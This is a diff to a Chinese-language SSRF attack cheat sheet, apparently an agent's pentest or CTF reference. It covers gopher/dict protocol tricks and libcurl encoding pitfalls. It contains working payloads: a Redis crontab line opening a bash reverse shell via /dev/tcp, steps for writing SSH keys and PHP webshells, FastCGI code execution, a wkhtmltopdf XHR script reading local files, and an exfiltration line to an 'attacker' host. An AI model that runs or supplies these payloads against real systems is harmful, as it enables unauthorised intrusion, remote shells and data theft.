@@ -65,13 +65,13 @@
 
 ## 4. gopher:// 与 dict://
 
-格式：`gopher://HOST:PORT/_<URL编码数据>`（`_` 被丢弃）。编码 `\r`→%0D、`\n`→%0A、空格→%20；端点先解码一次则双重编码 `%250D%250A`。
+格式：`gopher://HOST:PORT/_<URL编码数据>`（`_` 被丢弃）。编码 `\r`→%0D、`\n`→%0A、空格→%20；端点先解码一次则双重编码 `%250D%250A`。libcurl 发送时对**整个 selector** 百分号解码——请求行/头中的字面 `%XX` 线上会被解码变形（`GET /a%20b` 线上变 `GET /a b`，损坏请求行），需线上保留时写 `%25XX` 或用构造器对头部做 `%` 二次编码。libcurl 在 selector 后**固定追加一个 CRLF**——无 body 请求恰好补成头块空行; 带 body 请求 body 后多 2 字节 CRLF（HTTP 按 CL 读取无影响）。
 
 - **Redis 写 crontab**：FLUSHALL → SET 1 `"\n\n*/1 * * * * bash -i >& /dev/tcp/A/4444 0>&1\n\n"` → CONFIG SET dir /var/spool/cron/ + dbfilename root → SAVE（限定: ubuntu/debian 下写 crontab 反弹常失败——crontab 实现差异，CentOS 成功率高; gopher 手工拼包时 RESP `$N` 长度须随 payload 实际字节数同步改）
 - **Redis 写 SSH key**：dir /root/.ssh/ + authorized_keys；**写 webshell**：dir /var/www/html/ + shell.php
 - **MySQL**（空密码/skip-grant）：认证包；**SMTP**（25）：HELO/MAIL FROM/DATA 全流程；**FastCGI**（9000）：PHP_VALUE=auto_prepend_file=php://input；**Memcached**（11211）：stats / 伪造 session
 - **Gopherus 自动生成**：`--exploit mysql|redis|fastcgi|smtp`
-- **gopher 协议四坑**（version-sensitive）: ①curl<7.45 会截断 payload 中的 %00（FastCGI EXP 含 %00，需 libcurl≥7.45）②PHP curl 默认不跟随 302（需 CURLOPT_FOLLOWLOCATION 显式开启）③file_get_contents() 场景的 gopher payload 不能 URL 编码（与 curl 相反）④file_get_contents() 跟随 302 到 gopher 有 BUG 常失败——探测 SSRF sink 类型（curl vs file_get_contents）决定编码与跳转策略
+- **gopher 协议六坑**（version-sensitive）: ①curl<7.45 会截断 payload 中的 %00（FastCGI EXP 含 %00，需 libcurl≥7.45）②PHP curl 默认不跟随 302（需 CURLOPT_FOLLOWLOCATION 显式开启）③file_get_contents() 场景的 gopher payload 不能 URL 编码（与 curl 相反）④file_get_contents() 跟随 302 到 gopher 有 BUG 常失败——探测 SSRF sink 类型（curl vs file_get_contents）决定编码与跳转策略 ⑤**Content-Length 虚大陷阱**（libcurl）: libcurl 发送 selector 前对其做百分号解码——body 中的 `%XX`（3 字符）线上只占 1 字节，手工按编码前字符串计算 CL 会虚大 → 服务端按 CL 永久等待 body，症状为 SSRF 目标"挂起"（fetcher 超时、0 字节、无响应头），与请求行/头/内容无关且必然复现。防护: CL 按**解码后**字节数计算（`len(unquote_to_bytes(body))`——`unquote_to_bytes` 与 libcurl percent-decode 对齐: 任意 `%XX` 含非 UTF-8 字节按单字节还原、非法十六进制序列原样保留、`+` 不转换; **禁用 str 版 `unquote()`**——非 UTF-8 字节会被替换成 U+FFFD 重编码为 3 字节，CL 虚大重现挂起）; 或 body 避开 `%` 字符（JSON body 经 `json.dumps` 产出不含 `%XX`，天然安全）; 或直接用 `$AGENT_DIR/scripts/web_helpers.py` 的 `build_gopher_url`（自动修正 CL 且对请求行/头 `%` 二次编码，坑结构性消除）。**验证同构性规则**: webhook 字节级验证所用 body 必须与实战载荷**字符集同构**——验证 body 不含 `%XX` 而实战含时，"验证通过"不能证明编码路径正确（伪验证，错误结论会掩盖真根因） ⑥**libcurl ≥ 8.22.0 selector CR/LF 拒绝**（2026-09 发布）: 该版本起解码后校验 gopher selector，含 CR/LF 直接 `CURLE_URL_MALFORMAT` 拒绝（`curl: (3) Bad gopher selector, CR or LF not allowed`，不发起连接）——SSRF fetcher 跑新版 libcurl 时 gopher 构造 HTTP 请求的整条技法失效（①-⑤ 全部不可达），探测时先从 webhook UA 里的 libcurl 版本号确认; 本地验证产物须用 <8.22.0 的 curl 或裸 socket 客户端（python 直连发送）——新版 curl 会把一切构造产物 rc=3 拒掉，易误判为载荷构造错误
 - **302 协议升级**: 过滤只允许 http(s) 前缀时，可控服务器 302 `Location: gopher://127.0.0.1:port/...`（或 file:///dict://）——curl 跟随跳转不检查目标协议（除非 CURLOPT_PROTOCOLS 限制）; Discuz X3.2 `forum.php?mod=ajax&action=downremoteimg&message=[img]http://evil/test.php?a.jpg[/img]` 远程图拉取即此模式
 
 **file 协议与伪协议头**: ①curl 的 `file://任意host/path` 仍读本地文件（host 被忽略）——过 host 白名单后拼 `?` 截断尾部自动补的 `/`（`file://www.baidu.com/etc/flag?`）②file_get_contents() 把不认识的伪协议头当文件夹名，`httpsssss://../../../../etc/passwd` 即相对路径跨目录读（报错路径确认解析行为）
@@ -90,10 +90,12 @@
 
 | 生成器 | 触发 |
 |---|---|
-| wkhtmltopdf | iframe/img/link/@import/JS document.write；`file:///etc/passwd` |
+| wkhtmltopdf | iframe/img/link/@import/JS document.write；`file:///etc/passwd`；JS 同步 XHR `file://`（比 iframe 稳定） |
 | WeasyPrint | CSS url()；`<link rel="attachment" href="file:///etc/passwd">`（文件嵌入 PDF） |
 | Chrome Headless | 完整 JS：fetch 内网渲染进 body；WebSocket 探端口；dns-prefetch OOB |
 | PhantomJS | page.open() |
+
+**wkhtmltopdf 0.12.5 (Qt 4.8.7) 行为细节**: JS 同步 XHR 读文件首选——``<script>x=new XMLHttpRequest;x.open("GET","file:///flag.txt",false);x.send();document.write("<pre>"+x.responseText+"</pre>")</script>``。边界: 目录列举报 `NETWORK_ERR: XMLHttpRequest Exception 101`（仅放行普通文件）; `/proc/*`（cmdline/environ）读出空（size=0 文件）。错误 oracle: 渲染失败时接口常 500 并回显 wkhtmltopdf stderr（如 ``render failed: Exit with code 1 due to network error: ContentNotFoundError``）——可做文件存在性判定与失败原因定位。iframe 不稳定: 同 payload 有时 `ContentNotFoundError` 有时静默空白，不作首选载体。data: URI 子资源有效: base64 必须完整——截断的 base64 报 `ContentNotFoundError`，易误判为"子资源被禁"。原始 body 即文档: 部分实现把整个请求体写临时文件当主文档渲染（非法 JSON 也渲染）——body 中的 JSON 结构噪音用 `<style>` 隐藏，或直接发纯 HTML body。
 
 **输出不可见外带**：`new Image().src='http://attacker/exfil?data='+btoa(t)`；长数据切 60 字节进 DNS 子域。**UA 指纹**：wkhtmltopdf/HeadlessChrome/PhantomJS/WeasyPrint。**DevTools 9222 暴露**：`/json` 列目标 → WebSocket 全控。
 
@@ -109,7 +111,7 @@
 - **curl 重定向溢出**: CURLOPT_MAXREDIRS 超限后错误分支拿 CURLINFO_REDIRECT_URL 无校验再请求——重定向链恰好超限即打内网
 - **白名单正则未转义点**: `meepwntube.0x1337.space`（. 未转义）→ 注册 meepwntubex0x1337.space + A→127.0.0.1
 - **SNI 明文走私**: TLS ClientHello 的 SNI 是明文——对"解析原始字节"的服务（
-/  当终止符的 FTP）构造 hostname 使 SNI 字节构成合法命令；浏览器拒说目标协议时的信道
+/\x00 当终止符的 FTP）构造 hostname 使 SNI 字节构成合法命令；浏览器拒说目标协议时的信道
 - **PHP SoapClient gadget**: user_agent/uri CRLF 走私 + 反序列化后任意方法调用触发 __call() 发请求——unserialize 入口+方法调用点即 SSRF（内置类无依赖）
 - **凭据跟随泄露**: 服务端 fetch 用户 URL 且客户端库默认带 Authorization → nc 监听即收 Basic 凭据
 - **WeasyPrint attachment**: `<a/link rel="attachment" href>` 独立 fetch 路径——file:// 读文件嵌 PDF（pdfdetach 提取）/ 200 则 PDF 含 /Type /EmbeddedFile 作盲 oracle（CVE-2024-28184）
